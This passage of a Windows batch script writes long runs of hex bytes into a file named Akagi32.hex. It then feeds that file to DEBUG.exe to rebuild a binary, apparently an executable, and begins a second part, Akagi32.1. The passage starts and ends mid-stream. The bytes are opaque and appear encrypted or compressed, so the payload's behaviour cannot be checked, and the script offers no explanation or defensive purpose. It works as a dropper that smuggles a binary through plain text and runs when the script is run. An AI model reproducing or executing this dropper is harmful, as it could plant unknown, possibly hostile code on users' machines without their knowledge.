echo 51 e9 ea 73 83 be f1 51 0d ab ff 6a 06 59 33 da 05 56 ff 3e d7 01 21 22 2f 83 cd 38 5b 06 6b 9e 4a 1d 34 c3 60 83 bf 14 62 64 62 00 56 bc 0f fc ad 85 cf bb da 09 98 81 21 fd c8 50 73 f9 47 88 87 8d 39 63 63 6b 67 1b 3c 53 88 10 29 12 94 83 54 86 ac 38 69 23 bd dd 71 43 3a 00 e9 8f 34 16 65 83 a8 37 93 d3 d7 6f 70 95 e8 a8 58 ce a5 a3 89 c0 fd 1e f4 33 96 8f c7 e2 23 f4 09 23 42 b9>>Akagi32.hex
echo e fa80>>Akagi32.hex
echo 11 fb dd 54 e6 da 07 7d 1a 79 ba 1e 35 08 4f 9f 66 e9 92 18 bf de e7 94 a1 83 f7 79 77 54 1b bf 3c 98 76 58 23 53 5f 90 23 c3 50 5d 2e 2b 6b f5 93 8e f7 5b c9 fd 16 64 5e d0 07 ea 29 3f 45 f6 2b c1 dc 6b c4 de cb 2e 2d ab f6 e9 62 f2 44 f5 3a 93 67 45 03 6a 87 af 86 42 70 1b 65 82 54 d6 17 e3 bf 9c e9 bc 1b c3 fe cb 7a 07 56 6d 9a e2 2b cf 81 4b d9 14 27 31 e9 c7 80 df 17 02 56 f8>>Akagi32.hex
echo e fb00>>Akagi32.hex
echo e9 63 ff ec e0 c3 e7 53 27 d7 1c 0d 29 12 1e 2a e9 f9 b2 19 48 2d f9 84 4e c8 fa 9a c3 27 04 a0 f1 da 86 fa 85 0d 88 ad 67 fd ba 54 26 27 59 86 2e 2d 08 52 77 e7 80 cf 4e 2d 1c e4 8f f2 5f 27 7f 20 f8 32 37 c8 30 36 8e e2 6f 2b e9 2a 22 f6 14 f9 e9 b2 17 9a df 9f 67 ed 83 59 32 3c 58 ff 8e bd ca 1b 92 ad e9 4d 2e 81 94 0a ee 1c 68 f5 d4 c7 02 f0 19 c7 72 1b fe c4 8a 3f 09 89 66 28>>Akagi32.hex
echo e fb80>>Akagi32.hex
echo 68 aa aa 3e 93 a0 ec c8 08 91 ff 44 1e 62 52 fa 63 9a a5 e4 b2 cd bb b6 20 a6 e1 4b a9 2c 1a 97 da 20 fb 34 29 42 57 10 af e2 8a 0e a5 0d ca d7 ee d7 a8 64 46 6d 8a d5 07 82 be b0 e9 92 44 08 71 8d 7b 5c d6 23 9c 22 24 06 a2 db 17 2d 09 c1 0a b5 c6 0f c4 0d d8 d3 04 82 c0 73 75 48 2b c0 7f 51 a3 66 66 c5 dc af 6f 5d 8b 94 18 49 68 d1 a4 d3 c2 35 79 69 28 60 20 b2 7d 7b 73 43 ca a1>>Akagi32.hex
echo e fc00>>Akagi32.hex
echo 6c fb a2 53 24 c3 7c 21 1e 8d e2 eb 40 e2 75 7d 44 49 a8 6c f6 f5 dd 8f 62 46 87 b8 11 6f 2e de 02 b8 dc 8d 94 75 92 b4 49 4d 8d 44 cc 02 3a f5 b1 29 a8 84 49 69 f8 85 95 c7 6a 03 f9 25 0d 54 6c 69 c9 0c 06 f4 c7 49 ae 21 d8 72 69 24 25 bc e4 d0 ad 5b 89 2d ab c3 08 a5 eb 4b e9 92 07 f2 7d a9 b9 a3 b3 3d aa 06 1a bd 8f f4 70 12 a5 d3 94 d0 f2 bd 05 98 27 b6 81 e9 ba 48 f6 4c 35 e5>>Akagi32.hex
echo e fc80>>Akagi32.hex
echo 0b bb 09 f3 36 c1 b7 88 90 84 65 58 57 65 65 eb a4 f8 63 75 59 69 d9 89 87 0e 36 0b 7b 6d 0e d9 2c 9f f5 33 e6 8c cb 71 29 9a df 0b 29 2d 19 d9 04 b8 c8 1b 89 48 58 f1 13 b0 e4 72 56 68 5e 5f 6e 89 fc 31 a7 9c dd 71 37 c2 ca 69 7c 48 39 c1 2b e4 af 1b b6 c0 84 ec 5e 9e e2 67 16 42 39 d6 02 ae d6 1c 92 4c c4 43 18 b1 f1 6e 7b 25 4e b1 58 e4 ac 7d c6 1e bd c0 3d 02 f0 65 74 4e 37 99>>Akagi32.hex
echo e fd00>>Akagi32.hex
echo 47 64 b2 58 c6 80 f1 43 15 82 84 74 45 59 aa c7 02 b8 ca 5e 23 34 45 00 59 c6 dc fc 12 bc 5f 1c 6b 40 88 49 7f 55 b1 34 5a 49 09 08 df fa 05 a3 54 95 c2 18 c4 09 d8 d1 15 a7 cc 65 65 59 3a b7 00 bf dc 33 a5 9b fa 55 53 af c7 08 7a 41 5e 9a 2b 4e e7 1a b6 29 9a e5 3e 85 d0 42 52 2f 1b f6 1d 89 f0 26 88 a7 f6 b0 0e b5 eb 4b 56 66 6a f5 1c 77 2d 5b ee 2c 82 b0 81 57 f2 4b 01 dd 38 d8>>Akagi32.hex
echo e fd80>>Akagi32.hex
echo 03 b2 39 e7 99 d2 df 2e a1 f3 85 66 66 4c 28 d0 3f b9 ed 9a f9 30 90 e0 24 80 d3 8b 67 4e 73 0c 2e 1f f3 cd 89 ee 8e 38 41 89 d8 5a d6 f2 07 b4 4b 91 d1 44 e1 79 87 bf 29 bd 8a 66 e9 5d 25 91 71 a8 b6 b2 ec 5a 97 d1 39 c0 aa ef 27 51 68 f5 f4 c6 32 4b b0 e4 0a bb e1 d3 eb db 75 4c 2f f7 85 c9 ea 91 79 2c a7 49 a1 82 c2 3b a9 3d e8 a5 94 dc ec eb d9 93 05 b4 de cd 3a 04 b3 93 fb e8>>Akagi32.hex
echo e fe00>>Akagi32.hex
echo cf 86 18 69 26 c6 18 0f 25 a7 e6 59 73 4b 96 ea 93 87 e8 1a 14 af e7 c3 4c 7c 5f 02 96 20 5b db 0b a8 dc 33 a2 a5 ea 21 e1 08 ea 79 6f c8 e3 e6 2a 8e 08 bb a7 3a dc 80 53 82 ba 44 73 3d 45 c3 2a b9 06 78 81 8c 41 32 31 46 80 4d 6e 44 36 d0 de c6 12 75 21 7c 24 ba 5e c2 c0 65 72 5e 0c de 1a b4 86 ff a8 0a e6 0f 41 f3 a5 b4 1c ed 17 f0 05 d6 dc 2e d3 19 bd e3 03 90 81 6e 71 4d 2d c5>>Akagi32.hex
echo e fe80>>Akagi32.hex
echo 0f a8 d0 1c 5a a2 d8 db 61 10 f5 8d 94 ec 43 f1 3b ef ad 1a e3 24 91 fe 32 96 c4 6b 58 6e 1e e8 31 c8 e4 66 86 8a 60 51 02 b6 94 16 19 16 c5 37 04 c5 5d 4b 69 23 d1 ff 68 82 04 44 1f 62 52 fe 21 d5 18 5d 26 89 e9 45 00 ae f6 b4 98 62 1b 4a f4 c9 62 d5 78 e2 37 b5 42 f5 6a 0e d9 25 84 30 91 ee 23 e6 cf e3 9c 2f 6b dd 8f 14 1c 27 4a 8a 6c 21 92 5c e7 55 41 e8 5e 86 8b 3f 17 e9 43 51>>Akagi32.hex
echo e ff00>>Akagi32.hex
echo 67 2b 66 01 99 6e e7 1b 4f 9d 80 0a bc 71 5f f0 69 49 f6 01 f0 6e 81 ba 0e 89 0a a1 6f 5e b2 cd 29 b8 b4 cc e3 72 f0 0f 24 ba c5 38 65 d2 65 f9 9b 62 97 17 a9 76 c7 aa 7e d8 4a 0e 54 34 a6 78 6b dc 3c 7b 7d 8a 6a 3a 05 ce 2a 33 b9 15 c5 1a 53 a9 a8 e9 74 d1 d5 d0 63 b6 f7 3b 29 2d 16 d6 0d b4 d0 1d 83 82 d8 51 0c a7 c5 4b 4f 1c 29 f2 f4 c6 cb 34 3d ed ba ee 79 a5 18 4e 6e f2 5f 76>>Akagi32.hex
echo e ff80>>Akagi32.hex
echo b4 d8 86 35 89 be f5 7f 1b 8b ff f5 4c 82 fe 9a a1 db c6 34 b3 de 09 e8 13 a2 80 0b 29 6b 29 d8 03 9d ea 30 3a 85 d1 7f e3 82 57 48 94 69 45 aa 74 c9 b2 45 a9 f3 dd e3 22 2b 02 9a 13 12 1c d2 6e a8 fb 12 95 a9 dd 48 02 3e e0 7b 04 76 cd b5 03 ee cc 41 56 64 07 6a 1e 6d 8d a5 1e 32 5d 01 68 c3 bf 63 e0 ed 91 73 69 a3 e9 67 16 f7 17 da 0f a3 ac db c2 3f bd c2 08 a3 e9 62 f0 57 79 d2>>Akagi32.hex
echo r cx>>Akagi32.hex
echo ff00>>Akagi32.hex
echo w>>Akagi32.hex
echo q>>Akagi32.hex
debug<Akagi32.hex
debug /?
if NOT %ERRORLEVEL% == 0 echo &echo &echo &echo **** **** **** **** ****&echo *** Missing DEBUG.exe ***&echo **** **** **** **** ****&exit /b
echo n Akagi32.1>Akagi32.hex
echo e 0100>>Akagi32.hex
echo 3e f4 dc 12 0e 2a b8 25 ca 98 62 44 1c 62 50 fa 61 b3 d9 64 b1 53 df e4 52 c5 ba 0c 16 5d 2b b9 28 8d fd 3d b9 dc d1 40 17 f6 b1 20 43 45 35 4c ab 3a c3 2f f4 01 17 9b ae e9 f5 a4 d1 06 a6 b8 6b 9d b7 76 27 de 39 0a fe 81 f5 d9 76 27 24 e3 4e 2e 1c 5b b2 50 8c a7 41 49 5f 3c 26 22 94 36 61 d6 36 ca b7 c6 f1 5c 0b 76 85 6e 65 6d 1e dc 19 b3 ce 5b c2 03 aa c9 21 97 eb 49 16 6e 17 f7>>Akagi32.hex
echo e 0180>>Akagi32.hex
echo 2e 8f f8 23 a3 cc d9 66 5e e6 c4 79 64 4c 5e cc 2b d7 81 08 c2 1e b1 de f3 a5 80 77 56 1f 5b e7 2c 8a bd 23 e6 fe d8 00 29 82 df 0b 29 2d 1d d0 1f 9e cc 28 de 2f 58 df 05 a7 c5 44 74 47 5b 13 6f d9 e7 26 a3 8e d9 78 39 98 85 0b 4a 71 65 e9 0c ba c2 5b d4 0d b4 c2 0e ad f1 57 56 5e 22 c4 1a b9 d4 7b ec ff 9a 02 60 d1 f5 79 73 5d 06 c0 8b b8 cf 38 da 42 f8 e3 6b e0 8e ad 11 6e 2d 24>>Akagi32.hex
echo e 0200>>Akagi32.hex
echo 47 dd 82 3e 83 a1 d4 5f b3 a5 81 7e 56 74 58 2f 28 d6 a7 db 12 65 58 bb 21 82 26 73 61 4f 3e da 9e bf d6 1e 88 ce ee 10 48 43 b9 88 2f 59 13 f1 fb 65 e4 ee 05 b0 cc 31 7c 92 85 79 73 4b 3e c5 1c b9 dd f3 aa ad f6 57 14 a3 e2 cb 98 2d 19 f8 3e 9f e1 34 d5 0d 6c dc 04 43 08 41 d6 a7 db b7 29 1c b9 4d ad 4c 1c d0 1a 88 ba e6 01 ec 7e e4 2d d6 e9 15 e9 25 a8 c6 57 82 60 4b 76 66 5a a8>>Akagi32.hex
echo e 0280>>Akagi32.hex
echo 5e 94 38 d0 0b d2 4d 21 60 03 9d 58 62 4c 39 de 3f a4 ad 3a d5 09 98 f5 19 a1 e0 ab 66 59 32 d8 00 19 0f 22 26 7a 87 70 7c c5 46 fe 49 00 43 b4 4d 82 d4 2b 41 bd 02 71 42 40 83 39 f2 8d 7b c6 c2 b2 86 78 e7 2c 84 0f 28 ac e1 6e 6e 62 16 d3 2b bd c9 1a 94 24 9f 4f 5e af 02 e4 6b 31 51 ae 60 8c fc 31 a1 d3 a7 2e 04 5d 8b 8f b6 8f 42 30 61 e9 e4 28 57 ce 84 f3 0e ac eb 0b 8d cc 64 77>>Akagi32.hex
echo e 0300>>Akagi32.hex
echo 23 de f1 73 cb 99 d1 65 0f a9 eb eb 79 5a 34 f5 2b e9 b3 da b9 4b 86 b7 1e c8 e7 01 76 22 14 d1 08 b0 d0 53 88 a9 d8 73 36 42 00 42 78 4d 29 c1 0a ba c1 b8 c3 cd b6 ef 6f 8c fa 45 3b 22 64 bd 6e e3 f5 12 0a bf ec 0f 5d fd 3f 78 7f 66 c5 bf 6b d9 ad 34 d7 08 98 e8 0c ae c1 8b 79 4e 2e da 0b b2 cd 14 8b 14 d9 71 39 43 de ef 5b 1f 05 9b 9a eb a3 17 69 67 7a 6d a3 c9 ba 46 77 46 5b d2>>Akagi32.hex
echo e 0380>>Akagi32.hex
echo 22 b3 ce 16 94 8c d5 f0 14 b6 e4 69 7a 48 d7 e8 0b c4 62 a4 99 8d f7 1c 0d dd 8e 4a 4e 2d 50 b5 7e 2c ed 01 8f a1 60 3f a0 96 3a 44 62 3d 71 0a 6e 2a bb 19 07 50 e7 10 08 83 e9 0b 7a 42 38 f1 0f b5 d5 16 52 a8 d8 82 61 a3 d5 88 d3 2f 09 9a 15 c9 82 25 99 64 a7 b5 51 c4 fa 0e 29 7f 3e 97 0f b8 fb 0a 92 ec ff 63 04 42 f7 62 77 41 33 cf 0a b7 f5 ca 76 74 bd d1 0c ce 8e 4a 53 a2 1b 8c>>Akagi32.hex
echo e 0400>>Akagi32.hex
echo ff 59 66 f5 9f 76 b1 0f 67 fd 83 4b 47 63 1f f6 43 e4 ab 3b bf 0b b1 e0 ed b0 91 4f 5a 5d c8 ee bc f5 ec 3b af cc d6 63 35 83 cb 48 53 72 da ea 2b 96 f8 04 f1 39 58 ca 90 93 11 4c 24 1f 14 ad 2e fd d7 7a c1 8e 54 62 04 2d 80 e4 13 69 1a 52 6e c0 a4 ac a4 30 67 a2 d7 d0 d6 ca 1c 65 c7 75 22 66 bc f0 34 81 4a 76 0f a1 e0 4d 77 0e f8 4a 54 e1 f2 45 e9 72 87 b9 7e de 21 ac 16 13 04 be>>Akagi32.hex
echo e 0480>>Akagi32.hex
echo 61 d4 ac 2c ef 4c 33 93 5b 91 e4 65 7f 3d 2e dc 11 b3 0c 54 f8 0d b5 8c 04 82 6a 04 fe 22 db b3 39 a7 f8 36 5e 8e ce 03 de cf 3a 06 a9 20 65 da 6c 99 b2 71 e1 5e b7 b7 a5 c9 e0 67 86 48 15 4a be 6f ca c2 a9 4d 98 59 4c a3 86 2b 47 4c 5b 43 27 c6 8a 79 0e 2d 2f bb ee e7 0a 2e c8 98 2d e4 41 db 96 74 8a e3 9f 91 a1 8b 8e 58 4f 2d 5b d9 0e a7 af c4 bd 2d ba 01 50 3d 94 c8 f9 27 94 77>>Akagi32.hex
echo e 0500>>Akagi32.hex
echo 19 1d 76 f2 05 c6 57 36 5c c9 84 c4 10 2d 65 e6 0e a2 e1 32 76 18 bd c2 00 ae d6 3b 5d 8d f0 4b 2e 83 dc 70 b5 f7 b8 64 b6 d6 7a 5f e9 e7 65 e5 50 f9 a7 34 b0 03 de de 67 03 8c 46 73 c1 28 c4 3f d5 47 d6 ab 28 de 67 62 6d 9b f8 b9 33 f5 ab 0e a2 82 5d 22 e2 f7 b6 41 c4 87 34 e6 85 29 c3 1d 8b d0 07 9c a4 77 ad 20 02 c7 d4 80 02 87 6a 1c f8 92 24 b3 8b c3 e0 83 53 92 ca 4d 4d 59 d2>>Akagi32.hex
echo e 0580>>Akagi32.hex
echo 0f dc d5 33 d9 e8 cb 5d 00 b0 65 7f 46 59 28 f5 6e c6 e9 50 e1 6f 27 a3 47 96 fc 14 b9 02 67 98 52 03 bf ac e0 2e d1 b7 a0 9d 8f 37 17 57 09 c0 09 a5 5e aa 49 28 d0 94 6b d3 21 ca 14 dd 73 48 06 23 d1 ac c2 3b 17 35 92 3b 09 0e 29 52 58 ca 69 c9 a5 48 be 6b 6c b0 0c b0 ea 64 62 71 28 ce 2e af cd 16 8b ff aa 31 e1 b2 85 79 73 5d 06 c0 05 b4 ce 5b da 42 e7 e3 14 a0 f6 7f 56 5f 32 d9>>Akagi32.hex
echo e 0600>>Akagi32.hex
echo 09 9c ea 70 fe 99 98 5e 23 81 c9 4b 56 7c 1f b5 29 97 fd 1e f7 3a e9 82 61 82 cd 43 56 77 5b 88 3a de d6 77 a6 89 e0 53 04 b2 f1 db 7f 42 34 f5 6f 82 f8 5f e2 68 e6 b0 53 82 dd 51 16 71 07 88 ee 80 de 1f 89 ae f9 5c 69 38 82 11 9e 06 05 b2 e5 99 cf 31 d3 0f 26 c4 35 49 9a 25 11 69 5f c8 62 56 39 ec dd 4b 9b 29 4a cf bb 49 63 44 36 d1 0e d8 df 0f 30 2f fa 50 79 fd d0 65 44 a5 3e d0>>Akagi32.hex
echo e 0680>>Akagi32.hex
echo 07 dc 25 01 a2 80 58 a2 61 9b c4 53 43 72 1d e0 22 be e9 1b f6 ec 4c f7 21 51 25 8c 61 2d 39 d2 03 bf d6 1e 88 e2 93 6f 72 82 8d 79 d2 36 0e cc 1b b3 ad 1b e5 09 aa d9 00 ae ec 87 6c 4c 1a 1e 2e f1 dc 12 8b 49 dc b0 32 83 dd 5b 53 6f 0c 36 59 d0 ed 9b 00 6c fc e5 29 8b cb 58 16 79 1a f9 2d 99 e6 2c a6 02 d8 53 46 42 56 42 c7 78 34 8a 4b de 8d 5f 89 3b d8 8f 2c a7 e8 4a 7a 2d 37 d8>>Akagi32.hex
echo e 0700>>Akagi32.hex
echo 0d 9c fa 24 8f a2 98 03 53 86 e0 6d 77 58 36 b5 1f 97 df 3e d8 0d 98 f0 83 91 84 ec 4e 72 10 5a 3c c3 b2 74 ed 6d 3d 20 27 b0 e0 6e 82 3d 12 75 4c e8 f5 24 a6 8d 56 57 58 a6 95 d4 1c 2d 64 87 39 ae d0 07 86 c3 d8 11 0e b0 95 72 5a 42 3d 54 f9 97 ec 03 a8 26 87 be 2d cc 72 03 75 21 19 ce 1a b8 dc 00 ff 8b c9 75 81 cc c5 4c 53 12 db 14 b4 81 60 f7 b4 75 47 bc e8 ce ba 54 17 0e 7f fa>>Akagi32.hex
echo e 0780>>Akagi32.hex
echo 3b 95 f5 1c 85 ad e4 5c 04 63 bb 14 38 2b e7 b2 45 cf a4 64 a4 0e f8 fa 36 a7 a7 07 56 6d 02 89 2f dd b5 4c 92 ee 51 37 6d b6 8d 34 71 0d 3f c1 34 97 d9 bb 7c 0e ad b1 a0 e9 dd 66 7a 63 34 d3 0b eb dc 02 a7 e6 78 77 37 02 87 8d 12 6e 35 49 07 ba 6d e2 17 a7 27 78 73 18 fa 05 6b 23 fa 75 78 9e cc 15 80 ec 31 7d 21 ac 1d 62 45 57 1d a3 ca 34 ef 1c e9 d6 07 51 2e 4e 01 2a 05 f3 51 35>>Akagi32.hex
echo e 0800>>Akagi32.hex
echo 61 9f 5d e0 22 cc 67 74 ab 81 77 94 19 fb 78 da 6e 41 d3 39 b3 af df a8 09 a3 f7 ab 26 f3 db f6 2b 9e c7 34 29 e3 19 1e 61 c5 2a 76 2e ab db ba 28 ab f2 5e f6 6d d5 e5 64 66 82 fb 7d 0c 79 c4 b0 9c 06 51 67 85 29 12 90 c3 c9 cb 73 fd 01 ea 04 ce 7e 74 69 64 06 b8 ee c4 eb 7f 99 6c dc 38 68 cd 34 70 ec a3 ed 5e 15 73 8c fc 19 06 bc 25 0a fb e5 c4 bf f3 d1 0e f9 b0 97 ec 09 2b 7c 86>>Akagi32.hex
echo e 0880>>Akagi32.hex
echo e8 fc f8 32 f7 ca b3 39 17 d3 62 57 14 e2 10 4a 71 af de 82 da 16 d0 df 64 63 4d 0c 5e 7f 3e c4 7e ee f9 4c 47 31 a8 91 2b 8d 95 44 06 62 4a 85 28 b9 a8 6f bb 6b 79 16 00 c7 17 04 5f 43 35 d2 1c 2b 2e 74 d9 c4 ea 99 23 e3 29 94 1e b2 52 2a 63 29 3d 53 89 6a 67 1f 60 47 e6 95 75 24 bb a2 41 fe 57 10 ff 7f 07 7f 31 ac b7 ca 87 ba d3 9a 05 29 82 50 99 67 f9 bb 9e c5 b3 5e be 0c 06 e7>>Akagi32.hex
echo e 0900>>Akagi32.hex
echo 8e e8 42 52 e7 e8 df 02 10 52 6f 07 69 0d d0 87 8b d5 42 94 f7 a3 99 bf a9 03 a3 42 32 26 64 b1 51 da ba d3 2e ed 9b 7c 04 ac e2 7f 7e d2 15 7e e9 e7 82 74 b6 6a 97 f1 2d 83 aa 0e 62 fd 5a 01 58 91 dc 00 95 ad ff 55 9e 2d ab 28 c6 55 ff ba 4c 09 b6 84 ad bc c3 9f 67 dd 2d 24 87 0b 5d ad 4e da bb 69 a8 ad f5 ce 04 33 a3 ca 05 80 2f 7c 69 99 bc 14 a7 13 98 bf be c7 b6 93 ac 0f fe bf>>Akagi32.hex
echo e 0980>>Akagi32.hex
echo 3e 9c 86 57 e6 9f f5 51 13 b6 d5 7f 64 2d 1a e3 54 f2 ec 29 c4 0d 26 c9 d3 98 6d 09 e2 21 fe bd 49 d7 ba 94 b9 cf 67 e2 88 97 86 54 97 98 b7 4a 76 2a b0 84 bf b3 d1 4f 3c cb 5a 02 29 20 eb 44 b4 d5 eb 6a 2d ca ec 28 96 a7 87 7f 16 2e 27 f4 5c e9 dd 4f e9 76 87 aa 66 9d 9f d4 10 6a 52 15 d9 dc f9 26 88 8e db 7c 21 82 85 5a 53 6f 1b e5 2e 97 fb 5b e5 18 aa d9 0f a5 c5 39 16 6d 03 ed>>Akagi32.hex
echo e 0a00>>Akagi32.hex
echo 6e e3 de 16 92 cc c7 63 0e b7 f7 68 73 6d 5a f0 13 b5 c8 2b c2 05 b7 9a 0f c7 45 5e 14 ed 19 bd ae 80 e5 73 d9 90 ff 5c 0e a0 e4 67 16 5f 35 da 1f 8a de 22 c5 24 ac d5 0c ca 91 38 24 2c 7d c7 6e ae dc 03 ba b9 f6 52 02 ce e9 25 38 ef 58 85 3d b7 c1 2e b6 09 98 e8 0c ae cb 64 72 57 3e b0 ae 9d b7 b3 d5 43 be 1f 63 84 d2 0b 7f 43 69 87 2e a4 df 34 0a 1e 9b 31 27 c1 82 06 80 ac f5 fc>>Akagi32.hex
echo e 0a80>>Akagi32.hex
echo ee 74 aa 40 ae e6 a9 0f 12 c2 5f 43 44 48 4a c6 1e ba d9 d4 6c 21 9d f1 a1 83 dd 41 56 77 5b 18 2a 3f ac 94 64 d3 4f bc 21 dd d5 4e 1e a0 2c 97 c1 ce ad 1e ce 18 aa d1 02 b6 c8 0b 77 4e 33 de 00 b9 f7 12 e2 a1 fd d1 5e b5 e7 6e 7b 4e 4a da 06 b8 83 cb b9 2b bd c4 61 84 d4 4f 58 72 12 c7 18 d2 8d 99 f4 c6 96 30 62 8f e0 66 5a 2d 35 d2 24 b4 c7 3e d5 18 7f 9d 73 08 8b cb 04 7c 1d f4>>Akagi32.hex
echo e 0b00>>Akagi32.hex
echo 4a ea 94 61 e7 cb 9f 79 12 8e ea 68 77 41 2a f6 04 b8 c3 5b a4 ac a5 ef 68 f0 03 57 10 08 f4 b0 3c b9 de 1a 66 4c e8 42 25 8e c9 34 1f 05 53 5c 6d 83 93 35 09 64 1f 3d 01 4e 63 1a 3d 2a 18 d6 6e b0 d5 3d 92 9c f7 47 04 c2 f7 42 78 4b 35 c7 06 b7 ac ba 2f 6c 9b dc 13 81 f7 6e 16 4c 2f d2 23 bd d7 12 81 cc fd 54 28 ac f6 7f 77 43 52 d6 0e d6 2d 7b c5 18 aa c5 61 a1 f1 5b 77 5f 2f de>>Akagi32.hex
echo e 0b80>>Akagi32.hex
echo 0f 9c d5 3e 95 ab ce 67 c1 c0 f7 0b 54 44 34 d1 3f b9 ff 2e b6 02 ac d9 0c a7 c0 73 16 2c 98 b0 3b ae d0 73 a5 b9 ea 30 13 a7 eb 7f 5f 7d 5a f1 77 b3 db db 8c 4f db d0 60 ab e6 6e 5b 4c 55 fb ee fd fd 70 a2 a9 18 3b 0e 80 fc 79 15 68 34 c0 06 d3 ae 2f 36 09 aa d6 00 a1 e0 78 d2 2b 9a 77 52 9f d5 12 95 bf 58 33 24 c0 95 44 66 48 34 10 6e b0 c2 5b be 28 b4 dc 84 e7 d6 6e 64 5b 5b d2>>Akagi32.hex
echo e 0c00>>Akagi32.hex
echo 1c dc fd 03 9e 82 fd 30 16 88 ea 69 16 6a 3f db 4f b3 df 1b ab 2d bb f1 7e 93 f0 0b 73 58 3e b7 27 b2 d0 07 a6 8f f7 5d 0c ad eb 0b 08 59 4a c7 04 ba de 1b ac 20 b7 d1 61 a6 c9 62 74 5f 3a c5 17 dc ea 1b 8f a1 98 7e 04 b6 85 4a 66 44 18 c0 0d b0 c8 cb c4 2d b4 dc 01 86 f1 6e 9c 2f 93 f1 1c b9 b2 71 b4 a9 58 1d 8e c6 8d 58 7f 57 b8 b1 39 b3 c0 34 92 18 bd 50 6f b2 f0 2b 0a 7e 2e f7>>Akagi32.hex
echo e 0c80>>Akagi32.hex
echo 1e ac d6 01 92 bf d9 3a 00 4a f5 62 66 22 57 c5 22 a5 28 5e 85 8d af d0 d5 ab e1 aa 13 cd 59 f3 01 cc d4 12 8f a2 35 32 26 b0 ea 77 63 5d d7 b7 c8 d8 49 5d 35 6d 95 b4 32 da ed 6a 64 6f df fe 62 89 d7 10 47 79 97 65 12 a7 f7 60 1e 5a fb 89 ab 95 cc 35 d9 02 b1 f0 08 26 98 a9 66 8f 59 e3 1c bd b9 41 95 ee b8 2c 11 b5 44 0d f9 29 f8 b7 04 bb dd 64 76 7c da a5 a3 c6 07 1a 16 1a 78 b5>>Akagi32.hex
echo e 0d00>>Akagi32.hex
echo 3e bd 85 07 8e c3 9f 92 63 cb 82 0a 14 79 23 8d 1b b3 ad 39 e8 4c 9f 71 5f b4 e0 1b 45 4e 33 d2 4e 7c e9 01 8f 8e ee 10 6b 81 ea 42 78 3d 42 db 71 b3 ec 7b d4 8c 89 c1 4d 92 f7 64 73 0d 7c c4 07 fe ea 3f e6 c8 08 58 05 ca ea 7c 65 c4 69 e2 0f a5 ec 59 d4 dc c3 f2 0d a3 e6 60 74 8d 34 d6 1c b8 b9 5c e7 85 e8 b0 1e 83 a8 aa 17 1e 6b 5e 69 12 9d 10 b7 6d db f6 b1 ab f7 78 62 4a 5a fe>>Akagi32.hex
echo e 0d80>>Akagi32.hex
echo 1e d8 88 77 b7 6d 99 7e 04 ba 1a 0a 65 5c 72 f1 93 b7 d9 3a e7 6e d8 bb c6 c1 95 1f d6 03 44 17 67 2d 97 a3 da bd 81 e1 61 b1 c1 62 16 4c 3d db 04 a5 d9 32 d5 6c 95 df 05 a7 c0 65 77 4f 0f db 0b ee b5 20 d6 e3 eb e0 7c b6 e5 4d 7a 4c 3d c6 6a d3 bd 5a c3 2e a8 50 3b 8f e0 78 65 8d 19 e0 ef ed b8 27 83 be f5 59 0f 63 9c cb 74 6c 28 d0 3c b3 5f 08 09 22 2f 2f f1 94 cf 72 15 2d 54 b7>>Akagi32.hex
echo e 0e00>>Akagi32.hex
echo 71 dd a6 72 f9 cd 67 2f 60 dd 84 14 17 32 5b aa 6a c9 ac 44 b7 73 d9 91 7e c3 85 0b ee bd 0c b6 58 4e b9 73 e6 d4 b8 30 61 f2 14 5e 21 2c 28 85 6a 86 9d 5a 56 14 da 68 74 f2 84 0b 26 2c 1b cf 6c 8c 2a 73 ba cc f8 00 60 55 86 9c 16 bf aa b7 c1 03 9d 5b 0c 5c d8 7a 51 c2 fb 3b 16 fc 5a 1d a6 2c ba a5 d6 cc 7a 00 61 70 b5 0b bc d1 6a b5 79 66 ac 7f 86 6c 7c 00 61 68 0d 3b 16 5b 6b b7>>Akagi32.hex
echo e 0e80>>Akagi32.hex
echo 04 ec b9 9d d6 cc ce 68 51 c2 f4 08 4e dd 5b f1 5b d6 c9 f0 86 6c 29 b0 9d b2 85 19 e6 2a 77 87 6e 96 ff 43 e6 2a ec 31 df c0 55 2c 45 3f 2e 25 08 a3 dd ba 84 3b d8 83 41 c1 cd 6e 77 5d 29 e5 6e 15 ff 72 36 cd 88 75 0c a3 eb 6b 40 43 5a d0 3c d6 f8 5a f3 14 a8 b1 b1 c2 c0 65 60 44 29 d8 00 da d4 23 82 6f 20 43 36 c2 2b 08 15 6f 7f c7 3c d6 ad a1 b5 23 ad 32 15 92 d6 4f 73 4f 2e d0>>Akagi32.hex
echo e 0f00>>Akagi32.hex
echo 5d de a9 24 e6 cc e7 40 0d ad f6 6e d4 65 7a b1 07 b3 ad 74 04 6a db b3 f7 70 56 08 94 2a 0a e7 68 b5 cd a7 db d0 98 3a 50 c8 a1 60 22 2c 13 d1 6b 58 0f 0a b7 88 d8 a1 6a c2 85 d0 02 43 58 f3 6f 0c bf 38 a3 9e d6 75 2d c2 b6 39 38 49 36 d9 6b d6 2b 6c 67 60 f8 8c 0a b6 ea 7b 05 6f db b7 6e a7 ba 04 95 bc 38 f4 21 b6 e3 5c 16 60 58 b1 58 94 e9 34 ce fc d6 e3 24 90 10 08 84 8b 59 17>>Akagi32.hex
echo e 0f80>>Akagi32.hex
echo 04 bc d1 01 9f 2e a1 75 81 c3 e1 0b 9d f6 5c f4 18 c7 fb 6b b1 e9 7b 01 63 73 eb 40 73 54 da b5 06 2d b9 33 a2 a9 f4 55 15 a7 95 0a 41 49 5a e1 9a d6 ee 37 f6 7c 38 b0 61 82 c4 4f 40 6c 0b fe 1b da 3e 6b e7 82 ec 91 62 d6 89 5f 79 46 5e d0 05 26 8b 5e e4 18 b4 e3 61 b7 e7 4a 63 59 33 d8 1c 4c d0 07 9f 9f a8 55 61 d5 d8 0a fa 6e 35 25 15 77 ac ee e6 68 1a ba 99 8d a4 a8 12 c6 5b f9>>Akagi32.hex
echo e 1000>>Akagi32.hex
echo 1a 7e be 73 88 32 ec 10 70 a1 94 ea 37 12 5a aa 6a c9 ac 44 b7 53 c7 b1 7e c3 9a 0a 09 2c 44 b6 74 dd b8 73 a4 dc 68 30 79 c2 85 8b 7c 2c 5a bb 6a c6 ad eb 8f 13 d9 b0 68 c6 85 0f 16 65 9b b5 0e 6c b9 73 2a 8a 9a 6b 62 13 85 c7 14 19 3a b5 3d d6 ad 08 b6 33 d8 e6 61 87 81 0b 44 bd 5b fe 6e 93 b9 3d d3 3c 98 79 31 c2 c3 bb 16 5c 58 08 6f de 42 a5 b6 3c de b7 61 c0 85 db be 2b 5b b7>>Akagi32.hex
echo e 1080>>Akagi32.hex
